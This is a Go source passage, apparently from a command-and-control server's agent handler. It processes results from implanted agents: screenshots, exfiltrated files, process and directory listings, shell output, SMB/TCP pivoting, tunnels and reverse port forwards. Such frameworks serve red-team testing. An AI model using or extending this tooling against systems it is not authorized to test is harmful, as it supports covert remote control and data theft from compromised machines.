						var length uint32
						if err := binary.Read(buf, binary.LittleEndian, &length); err != nil {
							continue
						}
						note := make([]byte, length)
						if _, err := buf.Read(note); err != nil {
							continue
						}
						screen := make([]byte, len(msg.Data)-4-int(length))
						if _, err := buf.Read(screen); err != nil {
							continue
						}
						_ = Ts.TsScreenshotAdd(agentData.Id, string(note), screen)

					} else if msg.Type == CALLBACK_AX_DOWNLOAD_MEM {
						buf := bytes.NewReader(msg.Data)
						var length uint32
						if err := binary.Read(buf, binary.LittleEndian, &length); err != nil {
							continue
						}
						filename := make([]byte, length)
						if _, err := buf.Read(filename); err != nil {
							continue
						}
						data := make([]byte, len(msg.Data)-4-int(length))
						if _, err := buf.Read(data); err != nil {
							continue
						}
						name := Ts.TsConvertCpToUTF8(string(filename), agentData.ACP)
						fileId := fmt.Sprintf("%08x", mrand.Uint32())
						_ = Ts.TsDownloadSave(agentData.Id, fileId, name, data)

					} else if msg.Type == CALLBACK_ERROR {
						task.MessageType = adaptix.MESSAGE_ERROR
						task.Message = "BOF error"
						task.ClearText += ensureNewline(Ts.TsConvertCpToUTF8(string(msg.Data), agentData.ACP))
					} else {
						task.ClearText += ensureNewline(Ts.TsConvertCpToUTF8(string(msg.Data), agentData.ACP))
					}
				}

			case COMMAND_EXIT:
				task.Message = "The agent has completed its work (kill process)"
				_ = Ts.TsAgentTerminate(agentData.Id, task.TaskId)

			case COMMAND_JOB_LIST:
				var params AnsJobList
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var jobList []JobInfo
				err = Unmarshal(params.List, &jobList)
				if err != nil {
					continue
				}

				if len(jobList) > 0 {
					Output := fmt.Sprintf(" %-10s  %-13s\n", "JobID", "Type")
					Output += fmt.Sprintf(" %-10s  %-13s", "--------", "-------")

					for _, value := range jobList {
						stringType := "Unknown"
						if value.JobType == 0x2 {
							stringType = "Download"
						} else if value.JobType == 0x3 {
							stringType = "Process"
						} else if value.JobType == 0x6 {
							stringType = "Async BOF"
						}
						Output += fmt.Sprintf("\n %-10v  %-13s", value.JobId, stringType)
					}

					task.Message = "Job list:"
					task.ClearText = Output
				} else {
					task.Message = "No active jobs"
				}

			case COMMAND_JOB_KILL:
				task.Message = "Job killed"

			case COMMAND_LS:
				var params AnsLs
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				if agentData.Os == adaptix.OS_WINDOWS {
					var items []adaptix.ListingFileDataWin

					if !params.Result {
						task.Message = params.Status
						task.MessageType = adaptix.MESSAGE_ERROR
					} else {
						var Files []FileInfo
						err := Unmarshal(params.Files, &Files)
						if err != nil {
							continue
						}

						filesCount := len(Files)
						if filesCount == 0 {
							task.Message = fmt.Sprintf("The '%s' directory is EMPTY", params.Path)
						} else {
							var folders []adaptix.ListingFileDataWin
							var files []adaptix.ListingFileDataWin

							for _, f := range Files {
								date := int64(0)
								t, err := time.Parse("02/01/2006 15:04", f.Date)
								if err == nil {
									date = t.Unix()
								}

								fileData := adaptix.ListingFileDataWin{
									IsDir:    f.IsDir,
									Size:     f.Size,
									Date:     date,
									Filename: f.Filename,
								}

								if f.IsDir {
									folders = append(folders, fileData)
								} else {
									files = append(files, fileData)
								}
							}

							items = append(folders, files...)

							OutputText := fmt.Sprintf(" %-8s %-14s %-20s  %s\n", "Type", "Size", "Last Modified      ", "Name")
							OutputText += fmt.Sprintf(" %-8s %-14s %-20s  %s", "----", "---------", "----------------   ", "----")

							for _, item := range items {
								t := time.Unix(item.Date, 0).UTC()
								lastWrite := fmt.Sprintf("%02d/%02d/%d %02d:%02d", t.Day(), t.Month(), t.Year(), t.Hour(), t.Minute())
								if item.IsDir {
									OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "dir", "", lastWrite, item.Filename)
								} else {
									OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "", SizeBytesToFormat(item.Size), lastWrite, item.Filename)
								}
							}
							task.Message = fmt.Sprintf("Listing '%s'", params.Path)
							task.ClearText = OutputText
						}
					}
					Ts.TsClientGuiFilesWindows(task, params.Path, items)

				} else {
					var items []adaptix.ListingFileDataUnix

					if !params.Result {
						task.Message = params.Status
						task.MessageType = adaptix.MESSAGE_ERROR
					} else {
						var Files []FileInfo
						err := Unmarshal(params.Files, &Files)
						if err != nil {
							continue
						}

						filesCount := len(Files)
						if filesCount == 0 {
							task.Message = fmt.Sprintf("The '%s' directory is EMPTY", params.Path)
						} else {
							modeFsize := 1
							lnkFsize := 1
							userFsize := 1
							groupFsize := 1
							sizeFsize := 1
							dateFsize := 1

							for _, f := range Files {
								val := fmt.Sprintf("%d", f.Nlink)
								if len(val) > lnkFsize {
									lnkFsize = len(val)
								}
								val = fmt.Sprintf("%d", f.Size)
								if len(val) > sizeFsize {
									sizeFsize = len(val)
								}
								if len(f.Mode) > modeFsize {
									modeFsize = len(f.Mode)
								}
								if len(f.User) > userFsize {
									userFsize = len(f.User)
								}
								if len(f.Group) > groupFsize {
									groupFsize = len(f.Group)
								}
								if len(f.Date) > dateFsize {
									dateFsize = len(f.Date)
								}
							}

							format2 := fmt.Sprintf(" %%-%ds %%-%dd %%-%ds %%-%ds %%-%dd %%-%ds %%s", modeFsize, lnkFsize, userFsize, groupFsize, sizeFsize, dateFsize)
							OutputText := ""
							for _, fi := range Files {
								OutputText += fmt.Sprintf("\n"+format2, fi.Mode, fi.Nlink, fi.User, fi.Group, fi.Size, fi.Date, fi.Filename)

								fileData := adaptix.ListingFileDataUnix{
									IsDir:    fi.IsDir,
									Mode:     fi.Mode,
									User:     fi.User,
									Group:    fi.Group,
									Size:     fi.Size,
									Date:     fi.Date,
									Filename: fi.Filename,
								}
								items = append(items, fileData)
							}

							task.Message = fmt.Sprintf("Listing '%s'", params.Path)
							task.ClearText = OutputText
						}
					}
					Ts.TsClientGuiFilesUnix(task, params.Path, items)
				}

			case COMMAND_MKDIR:
				task.Message = "Directory created successfully"

			case COMMAND_MV:
				task.Message = "Object moved successfully"

			case COMMAND_PS:
				var params AnsPs
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				if agentData.Os == adaptix.OS_WINDOWS {
					var proclist []adaptix.ListingProcessDataWin

					if !params.Result {
						task.Message = params.Status
						task.MessageType = adaptix.MESSAGE_ERROR
					} else {
						var Processes []PsInfo
						err := Unmarshal(params.Processes, &Processes)
						if err != nil {
							continue
						}

						procCount := len(Processes)
						if procCount == 0 {
							task.Message = "Failed to get process list"
							task.MessageType = adaptix.MESSAGE_ERROR
							break
						} else {
							contextMaxSize := 10

							for _, p := range Processes {
								sessId, err := strconv.Atoi(p.Tty)
								if err != nil {
									sessId = 0
								}

								procData := adaptix.ListingProcessDataWin{
									Pid:         uint(p.Pid),
									Ppid:        uint(p.Ppid),
									SessionId:   uint(sessId),
									Arch:        "",
									Context:     p.Context,
									ProcessName: p.Process,
								}

								if len(procData.Context) > contextMaxSize {
									contextMaxSize = len(procData.Context)
								}
								proclist = append(proclist, procData)
							}

							type TreeProc struct {
								Data     adaptix.ListingProcessDataWin
								Children []*TreeProc
							}

							procMap := make(map[uint]*TreeProc)
							var roots []*TreeProc

							for _, proc := range proclist {
								node := &TreeProc{Data: proc}
								procMap[proc.Pid] = node
							}

							for _, node := range procMap {
								if node.Data.Ppid == 0 || node.Data.Pid == node.Data.Ppid {
									roots = append(roots, node)
								} else if parent, ok := procMap[node.Data.Ppid]; ok {
									parent.Children = append(parent.Children, node)
								} else {
									roots = append(roots, node)
								}
							}

							sort.Slice(roots, func(i, j int) bool {
								return roots[i].Data.Pid < roots[j].Data.Pid
							})

							var sortChildren func(node *TreeProc)
							sortChildren = func(node *TreeProc) {
								sort.Slice(node.Children, func(i, j int) bool {
									return node.Children[i].Data.Pid < node.Children[j].Data.Pid
								})
								for _, child := range node.Children {
									sortChildren(child)
								}
							}
							for _, root := range roots {
								sortChildren(root)
							}

							format := fmt.Sprintf(" %%-5v   %%-5v   %%-7v   %%-5v   %%-%vv   %%v", contextMaxSize)
							OutputText := fmt.Sprintf(format, "PID", "PPID", "Session", "Arch", "Context", "Process")
							OutputText += fmt.Sprintf("\n"+format, "---", "----", "-------", "----", "-------", "-------")

							var lines []string
							var formatTree func(node *TreeProc, prefix string, isLast bool)
							formatTree = func(node *TreeProc, prefix string, isLast bool) {
								branch := "├─ "
								if isLast {
									branch = "└─ "
								}
								treePrefix := prefix + branch
								data := node.Data
								line := fmt.Sprintf(format, data.Pid, data.Ppid, data.SessionId, data.Arch, data.Context, treePrefix+data.ProcessName)
								lines = append(lines, line)

								childPrefix := prefix
								if isLast {
									childPrefix += "    "
								} else {
									childPrefix += "│   "
								}
								for i, child := range node.Children {
									formatTree(child, childPrefix, i == len(node.Children)-1)
								}
							}

							for i, root := range roots {
								formatTree(root, "", i == len(roots)-1)
							}

							OutputText += "\n" + strings.Join(lines, "\n")
							task.Message = "Process list:"
							task.ClearText = OutputText
						}
					}
					Ts.TsClientGuiProcessWindows(task, proclist)

				} else {
					var proclist []adaptix.ListingProcessDataUnix

					if !params.Result {
						task.Message = params.Status
						task.MessageType = adaptix.MESSAGE_ERROR
					} else {
						var Processes []PsInfo
						err := Unmarshal(params.Processes, &Processes)
						if err != nil {
							continue
						}

						procCount := len(Processes)
						if procCount == 0 {
							task.Message = "Failed to get process list"
							task.MessageType = adaptix.MESSAGE_ERROR
							break
						} else {
							pidFsize := 3
							ppidFsize := 4
							ttyFsize := 3
							contextFsize := 7

							for _, p := range Processes {
								val := fmt.Sprintf("%d", p.Pid)
								if len(val) > pidFsize {
									pidFsize = len(val)
								}
								val = fmt.Sprintf("%d", p.Ppid)
								if len(val) > ppidFsize {
									ppidFsize = len(val)
								}
								if len(p.Tty) > ttyFsize {
									ttyFsize = len(p.Tty)
								}
								if len(p.Context) > contextFsize {
									contextFsize = len(p.Context)
								}

								processData := adaptix.ListingProcessDataUnix{
									Pid:         uint(p.Pid),
									Ppid:        uint(p.Ppid),
									TTY:         p.Tty,
									Context:     p.Context,
									ProcessName: p.Process,
								}
								proclist = append(proclist, processData)
							}

							type TreeProc struct {
								Data     adaptix.ListingProcessDataUnix
								Children []*TreeProc
							}

							procMap := make(map[uint]*TreeProc)
							var roots []*TreeProc

							for _, proc := range proclist {
								node := &TreeProc{Data: proc}
								procMap[proc.Pid] = node
							}

							for _, node := range procMap {
								if node.Data.Ppid == 0 || node.Data.Pid == node.Data.Ppid {
									roots = append(roots, node)
								} else if parent, ok := procMap[node.Data.Ppid]; ok {
									parent.Children = append(parent.Children, node)
								} else {
									roots = append(roots, node)
								}
							}

							sort.Slice(roots, func(i, j int) bool {
								return roots[i].Data.Pid < roots[j].Data.Pid
							})

							var sortChildren func(node *TreeProc)
							sortChildren = func(node *TreeProc) {
								sort.Slice(node.Children, func(i, j int) bool {
									return node.Children[i].Data.Pid < node.Children[j].Data.Pid
								})
								for _, child := range node.Children {
									sortChildren(child)
								}
							}
							for _, root := range roots {
								sortChildren(root)
							}

							format := fmt.Sprintf(" %%-%dv   %%-%dv   %%-%dv   %%-%dv   %%v", pidFsize, ppidFsize, ttyFsize, contextFsize)
							OutputText := fmt.Sprintf(format, "PID", "PPID", "TTY", "Context", "CommandLine")
							OutputText += fmt.Sprintf("\n"+format, "---", "----", "---", "-------", "-----------")

							var lines []string
							var formatTree func(node *TreeProc, prefix string, isLast bool)
							formatTree = func(node *TreeProc, prefix string, isLast bool) {
								branch := "├─ "
								if isLast {
									branch = "└─ "
								}
								treePrefix := prefix + branch
								data := node.Data
								line := fmt.Sprintf(format, data.Pid, data.Ppid, data.TTY, data.Context, treePrefix+data.ProcessName)
								lines = append(lines, line)

								childPrefix := prefix
								if isLast {
									childPrefix += "    "
								} else {
									childPrefix += "│   "
								}
								for i, child := range node.Children {
									formatTree(child, childPrefix, i == len(node.Children)-1)
								}
							}

							for i, root := range roots {
								formatTree(root, "", i == len(roots)-1)
							}

							OutputText += "\n" + strings.Join(lines, "\n")
							task.Message = "Process list:"
							task.ClearText = OutputText
						}
					}
					Ts.TsClientGuiProcessUnix(task, proclist)
				}

			case COMMAND_KILL:
				task.Message = "Process killed"

			case COMMAND_PWD:
				var params AnsPwd
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Current working directory:"
				task.ClearText = params.Path

			case COMMAND_SCREENSHOT:
				var params AnsScreenshots
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				count := 0
				if params.Screens != nil {
					count = len(params.Screens)
					if count == 1 {
						_ = Ts.TsScreenshotAdd(agentData.Id, "", params.Screens[0])
					} else {
						for num, screen := range params.Screens {
							_ = Ts.TsScreenshotAdd(agentData.Id, fmt.Sprintf("Monitor %d", num), screen)
						}
					}
				}
				task.Message = fmt.Sprintf("%d screenshots saved", count)

			case COMMAND_SHELL:
				var params AnsShell
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				task.Message = "Command output:"
				if agentData.Os == adaptix.OS_WINDOWS {
					task.ClearText = Ts.TsConvertCpToUTF8(params.Output, agentData.OemCP)
				} else {
					task.ClearText = params.Output
				}

			case COMMAND_REV2SELF:
				task.Message = "Token reverted successfully"
				emptyImpersonate := ""
				_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
					Impersonated *string `json:"impersonated"`
				}{Impersonated: &emptyImpersonate})

			case COMMAND_RM:
				task.Message = "Object deleted successfully"

			case COMMAND_UPLOAD:
				var params AnsUpload
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("File '%s' successfully uploaded", params.Path)
				Ts.TsClientGuiFilesStatus(task)

			case COMMAND_ZIP:
				var params AnsZip
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("Archive '%s' successfully created", params.Path)
				task.MessageType = adaptix.MESSAGE_SUCCESS

			// ─── New command handlers ────────────────────────────────────

			case COMMAND_BURST:
				var params AnsBurst
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Burst status: " + formatBurstStatus(params.Enabled, params.Sleep, params.Jitter)

			case COMMAND_DISKS:
				var params AnsDisks
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				var drives []DriveInfo
				err = Unmarshal(params.Drives, &drives)
				if err != nil {
					continue
				}

				var drivesList []adaptix.ListingDrivesDataWin
				OutputText := fmt.Sprintf(" %-8s %s\n %-8s %s", "Drive", "Type", "-----", "----")
				for _, d := range drives {
					OutputText += fmt.Sprintf("\n %-8s %s", d.Name, d.Type)
					drivesList = append(drivesList, adaptix.ListingDrivesDataWin{Name: d.Name})
				}
				task.Message = "Available drives:"
				task.ClearText = OutputText
				Ts.TsClientGuiDisksWindows(task, drivesList)

			case COMMAND_GETUID:
				var params AnsGetuid
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				username := params.Username
				if params.Domain != "" {
					username = params.Domain + "\\" + params.Username
				}
				task.Message = "Current user:"
				task.ClearText = username

				_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
					Username *string `json:"username"`
					Elevated *bool   `json:"elevated"`
				}{Username: &username, Elevated: &params.Elevated})

			case COMMAND_LINK:
				var params AnsLink
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				newAgentId, err2 := Ts.TsListenerInteralHandler(params.Watermark, params.Beat)
				if err2 != nil {
					continue
				}

				pivotId := fmt.Sprintf("%08x", mrand.Uint32())
				pivotType := "unknown"
				if params.LinkType == 1 {
					pivotType = "smb"
				}
				if params.LinkType == 2 {
					pivotType = "tcp"
				}
				_ = Ts.TsPivotCreate(pivotId, agentData.Id, newAgentId, pivotType, false)
				task.Message = fmt.Sprintf("Linked to %s via %s", newAgentId, pivotType)

			case COMMAND_PROFILE:
				var params AnsProfile
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				switch params.SubCmd {
				case 2:
					task.Message = fmt.Sprintf("Download chunk size set to %d bytes", params.IntValue)
				case 3:
					t := time.Unix(int64(params.IntValue), 0).UTC()
					task.Message = fmt.Sprintf("Kill date set to %s", t.Format("2006-01-02"))
				case 4:
					task.Message = fmt.Sprintf("Working time set to %s", params.StrValue)
				default:
					task.Message = "Profile updated"
				}

			case COMMAND_RPORTFWD_START:
				task.Message = "Reverse port forward command sent to agent"
				task.MessageType = adaptix.MESSAGE_SUCCESS

			case COMMAND_RPORTFWD_STOP:
				task.Message = "Reverse port forward stopped"
				task.MessageType = adaptix.MESSAGE_SUCCESS

			case COMMAND_SLEEP:
				var params AnsSleep
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				sleepVal := uint(params.Sleep)
				jitterVal := uint(params.Jitter)
				_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
					Sleep  *uint `json:"sleep"`
					Jitter *uint `json:"jitter"`
				}{Sleep: &sleepVal, Jitter: &jitterVal})

				task.Message = fmt.Sprintf("Sleep set to %ds, jitter %d%%", params.Sleep, params.Jitter)

			case COMMAND_TERMINATE:
				task.Message = "Agent terminated"
				_ = Ts.TsAgentTerminate(agentData.Id, task.TaskId)

			case COMMAND_UNLINK:
				var params AnsUnlink
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				pivotType := "unknown"
				if params.PivotType == 1 {
					pivotType = "smb"
				}
				if params.PivotType == 2 {
					pivotType = "tcp"
				}
				_, parentId, childId := Ts.TsGetPivotInfoById(params.PivotId)
				_ = Ts.TsPivotDelete(params.PivotId)
				if parentId != "" {
					Ts.TsAgentConsoleOutput(parentId, adaptix.MESSAGE_INFO, fmt.Sprintf("Pivot '%s' (%s) disconnected", params.PivotId, pivotType), "", true)
				}
				if childId != "" {
					Ts.TsAgentConsoleOutput(childId, adaptix.MESSAGE_INFO, fmt.Sprintf("Unlinked from parent via %s", pivotType), "", true)
				}
				task.Message = fmt.Sprintf("Pivot %s unlinked", params.PivotId)

			case COMMAND_PIVOT_EXEC:
				var params AnsPivotExec
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				_, _, childId := Ts.TsGetPivotInfoById(params.PivotId)
				if childId != "" {
					_ = Ts.TsAgentProcessData(childId, params.Data)
				}
				continue

			// ─── Tunnel/Terminal response handlers ───────────────────────

			case COMMAND_TUNNEL_START:
				var params AnsTunnelStart
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				if params.Success {
					Ts.TsTunnelConnectionResume(agentData.Id, params.ChannelId, false)
				} else {
					Ts.TsTunnelConnectionClose(params.ChannelId, true)
				}
				continue

			case COMMAND_TUNNEL_STOP:
				var params AnsTunnelClose
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				Ts.TsTunnelConnectionClose(params.ChannelId, false)
				continue

			case COMMAND_TUNNEL_REVERSE:
				var params AnsTunnelReverse
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				_, _, err2 := Ts.TsTunnelUpdateRportfwd(params.TunnelId, params.Success)
				if err2 != nil {
					continue
				}
				if params.Success && params.ChannelId > 0 {
					Ts.TsTunnelConnectionAccept(params.TunnelId, params.ChannelId)
				}
				continue

			case COMMAND_TERMINAL_START:
				var params AnsTerminalStart
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				Ts.TsTerminalConnResume(agentData.Id, params.TermId, false)
				continue

			case COMMAND_TERMINAL_STOP:
				var params AnsTerminalClose
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				_ = Ts.TsAgentTerminalCloseChannel(params.TermId, "closed")
				continue

			case COMMAND_ERROR:
				var params AnsError
				err := Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("Error %s", params.Error)
				task.MessageType = adaptix.MESSAGE_ERROR

			default:
				continue
			}

			outTasks = append(outTasks, task)
		}

	} else if inMessage.Type == 2 {

		if len(inMessage.Object) == 1 {
			err = Unmarshal(inMessage.Object[0], &job)
			if err != nil {
				goto HANDLER
			}

			task := taskData
			task.TaskId = job.JobId

			switch job.CommandId {

			case COMMAND_DOWNLOAD:
				var params AnsDownload
				err := Unmarshal(job.Data, &params)
				if err != nil {
					goto HANDLER
				}
				fileId := fmt.Sprintf("%08x", params.FileId)

				if params.Start {
					task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", params.Path, params.Size, fileId)
					_ = Ts.TsDownloadAdd(agentData.Id, fileId, params.Path, int64(params.Size))
				}

				_ = Ts.TsDownloadUpdate(fileId, 1, params.Content)

				if params.Finish {
					task.Completed = true

					if params.Canceled {
						task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
						_ = Ts.TsDownloadClose(fileId, 4)
					} else {
						task.Message = fmt.Sprintf("File download complete: [fid %v]", fileId)
						_ = Ts.TsDownloadClose(fileId, 3)
					}
				} else {
					goto HANDLER
				}

			case COMMAND_EXEC_BOF_ASYNC:
				var params AnsExecBofAsync
				err := Unmarshal(job.Data, &params)
				if err != nil {
					goto HANDLER
				}

				var msgs []BofMsg
				err = Unmarshal(params.Msgs, &msgs)
				if err != nil {
					goto HANDLER
				}

				task.Completed = false

				if params.Start {
					task.Message = fmt.Sprintf("Start async BOF [%v]", task.TaskId)
				} else if !params.Finish {
					task.Message = fmt.Sprintf("Async BOF [%v] output", task.TaskId)
				}

				for _, msg := range msgs {
					if msg.Type == CALLBACK_AX_SCREENSHOT {
						buf := bytes.NewReader(msg.Data)
						var length uint32
						if err := binary.Read(buf, binary.LittleEndian, &length); err != nil {
							continue
						}
						note := make([]byte, length)
						if _, err := buf.Read(note); err != nil {
							continue
						}
						screen := make([]byte, len(msg.Data)-4-int(length))
						if _, err := buf.Read(screen); err != nil {
							continue
						}
						_ = Ts.TsScreenshotAdd(agentData.Id, string(note), screen)

					} else if msg.Type == CALLBACK_AX_DOWNLOAD_MEM {
						buf := bytes.NewReader(msg.Data)
						var length uint32
						if err := binary.Read(buf, binary.LittleEndian, &length); err != nil {
							continue
						}
						filename := make([]byte, length)
						if _, err := buf.Read(filename); err != nil {
							continue
						}
						data := make([]byte, len(msg.Data)-4-int(length))
						if _, err := buf.Read(data); err != nil {
							continue
						}
						name := Ts.TsConvertCpToUTF8(string(filename), agentData.ACP)
						fileId := fmt.Sprintf("%08x", mrand.Uint32())
						_ = Ts.TsDownloadSave(agentData.Id, fileId, name, data)

					} else if msg.Type == CALLBACK_ERROR {
						task.MessageType = adaptix.MESSAGE_ERROR
						task.Message = fmt.Sprintf("Async BOF [%v] error", task.TaskId)
						task.ClearText += ensureNewline(Ts.TsConvertCpToUTF8(string(msg.Data), agentData.ACP))
					} else {
						task.ClearText += ensureNewline(Ts.TsConvertCpToUTF8(string(msg.Data), agentData.ACP))
					}
				}

				if params.Finish {
					task.Message = fmt.Sprintf("Async BOF [%v] finished", task.TaskId)
					task.Completed = true
				}

			case COMMAND_RUN:
				var params AnsRun
				err := Unmarshal(job.Data, &params)
				if err != nil {
					goto HANDLER
				}

				task.Completed = false

				if params.Start {
					task.Message = fmt.Sprintf("Run process [%v] with pid '%v'", task.TaskId, params.Pid)
				}

				if agentData.Os == adaptix.OS_WINDOWS {
					task.ClearText = Ts.TsConvertCpToUTF8(params.Stdout, agentData.OemCP)
				} else {
					task.ClearText = params.Stdout
				}

				if params.Stderr != "" {
					errorStr := params.Stderr
					if agentData.Os == adaptix.OS_WINDOWS {
						errorStr = Ts.TsConvertCpToUTF8(params.Stderr, agentData.OemCP)
					}
					task.ClearText += fmt.Sprintf("\n --- [error] --- \n%v ", errorStr)
				}

				if params.Finish {
					task.Message = fmt.Sprintf("Process [%v] with pid '%v' finished", task.TaskId, params.Pid)
					task.Completed = true
				}

			default:
				goto HANDLER
			}

			outTasks = append(outTasks, task)
		}
	}

HANDLER:
	for _, task := range outTasks {
		Ts.TsTaskUpdate(agentData.Id, task)
	}

	return nil
}
